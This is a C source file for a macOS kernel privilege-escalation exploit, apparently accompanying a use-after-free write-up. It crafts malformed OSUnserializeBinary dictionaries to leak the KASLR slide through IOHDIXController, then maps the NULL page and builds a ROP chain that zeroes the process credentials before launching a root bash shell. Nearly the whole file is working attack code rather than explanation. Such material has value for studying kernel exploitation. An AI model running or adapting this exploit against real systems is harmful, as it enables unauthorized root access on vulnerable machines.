//
//  main.c
//  uaf_writeup
//
//  Created by jndok on 01/10/16.
//  Copyright © 2016 jndok. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>

#include "librop.h"

#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>

#define kOSSerializeBinarySignature "\323\0\0"

enum {
    kOSSerializeDictionary   = 0x01000000U,
    kOSSerializeArray        = 0x02000000U,
    kOSSerializeSet          = 0x03000000U,
    kOSSerializeNumber       = 0x04000000U,
    kOSSerializeSymbol       = 0x08000000U,
    kOSSerializeString       = 0x09000000U,
    kOSSerializeData         = 0x0a000000U,
    kOSSerializeBoolean      = 0x0b000000U,
    kOSSerializeObject       = 0x0c000000U,
    kOSSerializeTypeMask     = 0x7F000000U,
    kOSSerializeDataMask     = 0x00FFFFFFU,
    kOSSerializeEndCollection = 0x80000000U,
};

uint64_t kslide_infoleak(void)
{
    kern_return_t kr = 0, err = 0;
    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;
    
    io_service_t serv = 0;
    io_connect_t conn = 0;
    io_iterator_t iter = 0;
    
    uint64_t kslide = 0;
    
    void *dict = calloc(1, 512);
    uint32_t idx = 0; // index into our data
    
#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)
    
    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning
    
    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries
    
    WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte
    WRITE_IN(dict, (0x00414141)); // 'AAA' key + NUL byte in little-endian
    
    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number
    WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big numbe
    
    host_get_io_master(mach_host_self(), &master); // get iokit master port
    
    kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &res);
    if (kr == KERN_SUCCESS) {
        printf("(+) Dictionary is valid! Spawning user client...\n");
    } else
        return -1;
    
    serv = IOServiceGetMatchingService(master, IOServiceMatching("IOHDIXController"));
    
    kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &err, &conn);
    if (kr == KERN_SUCCESS) {
        printf("(+) UC successfully spawned! Leaking bytes...\n");
    } else
        return -1;
    
    IORegistryEntryCreateIterator(serv, "IOService", kIORegistryIterateRecursively, &iter);
    io_object_t object = IOIteratorNext(iter);
    
    char buf[0x200] = {0};
    mach_msg_type_number_t bufCnt = 0x200;
    
    kr = io_registry_entry_get_property_bytes(object, "AAA", (char *)&buf, &bufCnt);
    if (kr == KERN_SUCCESS) {
        printf("(+) Done! Calculating KASLR slide...\n");
    } else
        return -1;
    
#if 0
    for (uint32_t k = 0; k < 128; k += 8) {
        printf("%#llx\n", *(uint64_t *)(buf + k));
    }
#endif
    
    uint64_t hardcoded_ret_addr = 0xffffff80003934bf;
    
    kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;
    
    printf("(i) KASLR slide is %#016llx\n", kslide);
    
    return kslide;
}

void use_after_free(void)
{
    kern_return_t kr = 0;
    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;
    
    /* craft the dictionary */
    
    printf("(i) Crafting dictionary...\n");
    
    void *dict = calloc(1, 512);
    uint32_t idx = 0; // index into our data
    
#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)
    
    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning
    
    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 6)); // dict with 6 entries
    
    WRITE_IN(dict, (kOSSerializeString | 4));   // string 'AAA', will get freed
    WRITE_IN(dict, (0x00414141));
    
    WRITE_IN(dict, (kOSSerializeBoolean | 1));  // bool, true
    
    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol 'BBB'
    WRITE_IN(dict, (0x00424242));
    
    WRITE_IN(dict, (kOSSerializeData | 32));    // data (0x00 * 32)
    WRITE_IN(dict, (0x00000000));
    WRITE_IN(dict, (0x00000000));
    WRITE_IN(dict, (0x00000000));
    WRITE_IN(dict, (0x00000000));
    WRITE_IN(dict, (0x00000000));
    WRITE_IN(dict, (0x00000000));
    WRITE_IN(dict, (0x00000000));
    WRITE_IN(dict, (0x00000000));
    
    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol 'CCC'
    WRITE_IN(dict, (0x00434343));
    
    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1));   // ref to object 1 (OSString)
    
    /* map the NULL page */
    
    mach_vm_address_t null_map = 0;
    
    vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);
    
    kr = mach_vm_allocate(mach_task_self(), &null_map, PAGE_SIZE, 0);
    if (kr != KERN_SUCCESS)
        return;
    
    macho_map_t *map = map_file_with_path(KERNEL_PATH_ON_DISK);
    
    printf("(i) Leaking kslide...\n");
    
    SET_KERNEL_SLIDE(kslide_infoleak()); // set global kernel slide
    
    /* set the stack pivot at 0x20 */
    
    *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot
    
    /* build ROP chain */
    
    printf("(i) Building ROP chain...\n");
    
    rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));
    
    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_current_proc"));
    
    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);
    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_proc_ucred"));
    
    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);
    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_posix_cred_get"));
    
    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);
    PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3));
    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_bzero"));
    
    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_thread_exception_return"));
    
    /* chain transfer, will redirect execution flow from 0x0 to our main chain above */
    
    uint64_t *transfer = (uint64_t *)0x0;
    transfer[0] = ROP_POP_RSP(map);
    transfer[1] = (uint64_t)chain->chain;
    
    /* trigger */
    
    printf("(+) All done! Triggering the bug!\n");
    
    host_get_io_master(mach_host_self(), &master); // get iokit master port
    
    kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &res);
    if (kr != KERN_SUCCESS)
        return;
}

int main(int argc, const char * argv[]) {
    
    sync();
    
    use_after_free();
    
    if (getuid() == 0) {
        puts("(+) got r00t!");
        system("/bin/bash");
    }
    
    return 0;
}
